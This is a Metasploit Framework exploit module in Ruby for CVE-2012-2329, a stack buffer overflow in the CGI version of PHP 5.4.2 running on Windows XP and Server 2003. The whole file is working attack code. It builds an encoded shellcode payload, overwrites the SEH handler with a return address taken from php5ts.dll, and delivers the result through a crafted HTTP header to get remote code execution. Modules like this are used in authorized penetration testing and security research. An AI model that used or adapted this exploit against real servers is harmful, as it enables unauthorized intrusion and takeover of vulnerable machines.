# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::Remote::Seh
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;PHP apache_request_headers Function Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a stack based buffer overflow in the CGI version of PHP
                5.4.x before 5.4.3. The vulnerability is due to the insecure handling of the
                HTTP headers.
 
                    This module has been tested against the thread safe version of PHP 5.4.2,
                from "windows.php.net", running with Apache 2.2.22 from "apachelounge.com".
            },
            &#039;Author&#039;         =>
                [
                    &#039;Vincent Danen&#039;, # Vulnerability discovery
                    &#039;juan vazquez&#039;, # Metasploit module
                ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision$&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2012-2329&#039;],
                    [ &#039;OSVDB&#039;, &#039;82215&#039;],
                    [ &#039;BID&#039;, &#039;53455&#039;],
                    [ &#039;URL&#039;, &#039;http://www.php.net/archive/2012.php#id2012-05-08-1&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.php.net/ChangeLog-5.php#5.4.3&#039;],
                    [ &#039;URL&#039;, &#039;https://bugzilla.redhat.com/show_bug.cgi?id=820000&#039; ]
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                },
            &#039;Privileged&#039;     => true,
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;       => 1321,
                    &#039;DisableNops&#039; => true,
                    &#039;BadChars&#039;    => "\x00\x0d\x0a\x5f\x80\x8e\x9e\x9f" + (0x41..0x5a).to_a.pack("C*") + (0x82..0x8c).to_a.pack("C*") + (0x91..0x9c).to_a.pack("C*"),
                    &#039;EncoderType&#039; => Msf::Encoder::Type::NonUpperUnderscoreSafe,
                    &#039;EncoderOptions&#039; =>
                        {
                            &#039;BufferOffset&#039; => 0x0
                        }
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [&#039;Windows XP SP3 / Windows 2003 Server SP2 (No DEP) / PHP 5.4.2 Thread safe&#039;,
                        {
                            &#039;Ret&#039;    => 0x1002aa79, # ppr from php5ts.dll
                            &#039;Offset&#039; => 1332
                        }
                    ],
                ],
            &#039;DefaultTarget&#039;  => 0,
            &#039;DisclosureDate&#039; => &#039;May 08 2012&#039;))
 
        register_options(
            [
                OptString.new(&#039;TARGETURI&#039;, [true, &#039;The URI path to the php using apache_request_headers&#039;, &#039;/php/test.php&#039;]),
            ], self.class)
 
    end
 
    def exploit
        print_status("Trying target #{target.name}...")
 
        # Make ECX point to the start of the encoded payload
        align_ecx = "pop esi\n" # "\x5e"
        esi_alignment = target[&#039;Offset&#039;] + # Space from the start of align_ecx to nseh handler
            8 + # len(nseh + seh)
            5 - # len(call back)
            11 # len(align_ecx)
        align_ecx << "add esi, -#{esi_alignment}\n" # "\x81\xC6" + 4 bytes imm (ex: "\xCA\xFA\xFF\xFF")
        align_ecx << "sub ecx, ecx\n" # "\x29\xC9"
        align_ecx << "add ecx, esi" # "\x01\xf1"
        sploit = Metasm::Shellcode.assemble(Metasm::Ia32.new, align_ecx).encode_string
        # Encoded payload
        sploit << payload.encoded
        # Padding if needed
        sploit << rand_text(target[&#039;Offset&#039;]-sploit.length)
        # SEH handler overwrite
        sploit << generate_seh_record(target.ret)
        # Call back "\xE8" + 4 bytes imm (ex: "\xBF\xFA\xFF\xFF")
        sploit << Metasm::Shellcode.assemble(Metasm::Ia32.new, "call $-#{target[&#039;Offset&#039;]+8}").encode_string
        # Make it crash
        sploit << rand_text(4096 - sploit.length)
 
        print_status("Sending request to #{datastore[&#039;RHOST&#039;]}:#{datastore[&#039;RPORT&#039;]}")
 
        res = send_request_cgi({
            &#039;uri&#039;          => target_uri.to_s,
            &#039;method&#039;       => &#039;GET&#039;,
            &#039;headers&#039;      =>
            {
                "HTTP_X_#{rand_text_alpha_lower(4)}" => sploit,
            }
        })
 
        if res and res.code == 500
            print_status "We got a 500 error code. Even without a session it could be an exploitation signal!"
        end
 
        handler
    end
end



